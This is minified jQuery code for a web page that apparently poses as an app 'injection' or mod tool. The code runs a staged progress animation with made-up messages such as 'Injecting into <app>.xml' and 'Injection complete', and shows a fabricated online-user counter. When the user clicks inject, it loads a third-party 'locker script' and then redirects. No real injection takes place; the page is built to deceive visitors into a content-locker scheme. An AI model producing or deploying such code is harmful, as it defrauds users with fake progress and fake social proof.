$(window).load(function(){var n=document.getElementById("preloader");setTimeout(function(){n.className+=" loader-removed"},500),setTimeout(function(){$("#preloader").remove()},1200)}),$(document).ready(function(){$proccess_txt_string_2="Prepare to process...",$proccess_txt_string_3="Injecting into",$proccess_txt_string_4="Injection complete",$proccess_txt_string_5="Checking App...",$proccess_txt_file_format=".xml",$("#search-filter").keyup(function(){var n=$(this).val();$(".app-listing-wrapper ul li").each(function(){$(this).text().search(new RegExp(n,"i"))<0?$(this).fadeOut():($(this).show(),0)})}),$("#search-form").on("keyup keypress",function(n){if(13===(n.keyCode||n.which))return n.preventDefault(),!1}),$("li.app-listing-row").click(function(){$(".main-content-section").append('<div id="M140i" class="animated slideInUp"></div>'),$selected_app_img=$(this).find("img.app-image").attr("src"),$selected_app_header_img=$(this).find("img.app-header-image").attr("src"),$selected_app_title=$(this).find(".app-name").text(),$selected_app_description=$(this).find(".app-description").text(),$locker_script=$(this).attr("data-locker-script"),$.ajax({type:"GET",url:"`/xo.php",success:function(n){$("#M140i").html(n).hide().fadeIn(),console.clear(),console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"),$(".app-inject-header").css("background-image","url("+$selected_app_header_img+")"),$(".injection-app-icon").attr("src",$selected_app_img),online_count(),document.getElementById("date").innerHTML=function(){var n=new Date;n.getHours().toString().length,n.getHours(),n.getHours();return n.getDate()+" "+["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"][n.getMonth()]+" "+n.getFullYear()+" "}(),$(".x-sign-wrapper").click(function(){$("#M140i").fadeOut(function(){$("#M140i").remove()})}),$("#inject-now").click(function(){$.ajax({type:"GET",url:"`/x0.php",success:function(n){function e(n,e,t){var i=n*e.width()/100;e.find("div").animate({width:i},t).html(n+"%&nbsp;")}$("#M140i").append('<div id="proccessing-wrapper"></div>'),$("#proccessing-wrapper").html(n).hide().fadeIn(),$(".proccessing-content").append('<script type="text/javascript" id="ogjs" src="'+$locker_script+'"><\/script>'),console.clear(),console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"),e(0,$("#progressBarConsole"),1),e(100,$("#progressBarConsole"),15500),$(".proccessing-string-wrapper").html("Connecting..."),$(".proccessing-string-wrapper").addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){$(this).removeClass("animated bounceIn")}),setTimeout(function(){$(".proccessing-string-wrapper").html($proccess_txt_string_2),$(".proccessing-string-wrapper").addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){$(this).removeClass("animated bounceIn")})},2500),setTimeout(function(){$(".proccessing-string-wrapper").html($proccess_txt_string_3+" "+$selected_app_title+$proccess_txt_file_format),$(".proccessing-string-wrapper").addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){$(this).removeClass("animated bounceIn")})},6500),setTimeout(function(){$(".proccessing-string-wrapper").html($proccess_txt_string_4),$(".proccessing-string-wrapper").addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){$(this).removeClass("animated bounceIn")})},9500),setTimeout(function(){$(".proccessing-string-wrapper").html($proccess_txt_string_5),$(".proccessing-string-wrapper").addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){$(this).removeClass("animated bounceIn")})},12500),setTimeout(function(){location.href="**"},15500)}})})}})})});var random,starting_number=10;function online_count(){document.getElementById("online-count").innerHTML=starting_number,Math.floor(1*Math.random()+1)<=22?starting_number+=Math.floor(Math.random()+0):starting_number-=Math.floor(Math.random()+0),random=setTimeout("online_count()",1e3)}